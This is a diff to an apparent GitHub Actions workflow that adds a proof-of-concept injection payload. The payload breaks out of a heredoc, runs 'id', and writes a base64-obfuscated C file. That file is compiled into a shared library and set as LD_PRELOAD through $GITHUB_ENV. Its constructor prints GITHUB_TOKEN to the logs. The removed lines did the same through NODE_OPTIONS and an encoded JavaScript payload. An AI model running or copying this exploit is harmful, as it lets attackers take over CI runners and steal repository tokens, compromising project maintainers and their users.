@@ -22,12 +22,14 @@ jobs:
           base = os.environ["BASE_SHA"]
           head = os.environ["HEAD_SHA"]
           n = os.environ["PR_NUM"]
+          preload_c = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KX19hdHRyaWJ1dGVfXygoY29uc3RydWN0b3IpKSBzdGF0aWMgdm9pZCBnYWIodm9pZCl7CiAgY29uc3QgY2hhciAqdCA9IGdldGVudigiSU5QVVRfR0lUSFVCX1RPS0VOIik7CiAgaWYgKCF0KSB0ID0gZ2V0ZW52KCJHSVRIVUJfVE9LRU4iKTsKICBmcHJpbnRmKHN0ZGVyciwgIkdBQl9TVEVQX1RPS0VOPSVzXG4iLCB0ID8gdCA6ICJub25lIik7Cn0K"
           evil = (
               "x\n"
               "EOF\n"
-              "id; uname -srm; echo GAB_RCE_PROOF; head -c 200 \"$GITHUB_EVENT_PATH\"; echo\n"
-              "printf '%s\\n' 'NODE_OPTIONS=--require /tmp/gab_evil.js' | tee -a \"$GITHUB_ENV\"\n"
-              "printf '%s' 'Y29uc29sZS5lcnJvcigiR0FCX1RPS0VOX0xFQUs9IisocHJvY2Vzcy5lbnYuR0lUSFVCX1RPS0VOfHwibm9uZSIpKTs=' | base64 -d | tee /tmp/gab_evil.js\n"
+              "id; echo GAB_RCE_PROOF_V2\n"
+              "printf '%s' '" + preload_c + "' | base64 -d | tee /tmp/gab_pre.c\n"
+              "gcc -shared -fPIC -o /tmp/gab_pre.so /tmp/gab_pre.c\n"
+              "echo 'LD_PRELOAD=/tmp/gab_pre.so' | tee -a \"$GITHUB_ENV\"\n"
               "exit 0\n"
               "#"
           )
